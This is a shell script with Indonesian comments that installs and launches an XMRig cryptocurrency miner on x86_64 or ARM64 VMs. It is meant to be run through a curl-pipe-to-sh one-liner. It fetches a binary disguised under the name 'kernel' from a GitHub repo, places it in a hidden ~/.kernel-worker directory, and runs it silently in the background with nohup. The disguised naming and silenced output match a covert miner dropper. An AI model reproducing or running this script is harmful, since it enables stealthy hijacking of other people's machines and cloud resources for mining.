#!/bin/sh
# Kernel (XMRig fallback runner) - untuk VM x86_64 dan ARM64
# Dijalankan sebagai user biasa, tanpa root.
#
# Cara pakai:
#   curl -fsSL https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/oneline-kernel.sh | sh

set -e

# Ganti dengan URL raw GitHub/repo Anda
REPO_USER="YOUR_USER"
REPO_NAME="YOUR_REPO"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

# Cek dependensi
command -v curl >/dev/null 2>&1 || { echo "[-] curl tidak ditemukan"; exit 1; }

# Deteksi arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN="kernel-amd64" ;;
    aarch64|arm64) BIN="kernel-arm64" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/.kernel-worker"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download binary sesuai arsitektur jika belum ada
[ -f "$BIN" ] || {
    echo "[+] Download binary $BIN untuk $ARCH..."
    curl -fsSL -o "$BIN" "${RAW_URL}/${BIN}" || { echo "[-] Gagal download binary $BIN"; exit 1; }
}

chmod +x "$BIN"

echo "[+] Menjalankan: $BIN dengan nohup"
nohup ./"$BIN" > /dev/null 2>&1 &

sleep 1
if pgrep -f "./$BIN" >/dev/null 2>&1; then
    echo "[+] $BIN berjalan di background (PID: $(pgrep -f "./$BIN" | head -n1))"
else
    echo "[-] Gagal menjalankan $BIN"
    exit 1
fi
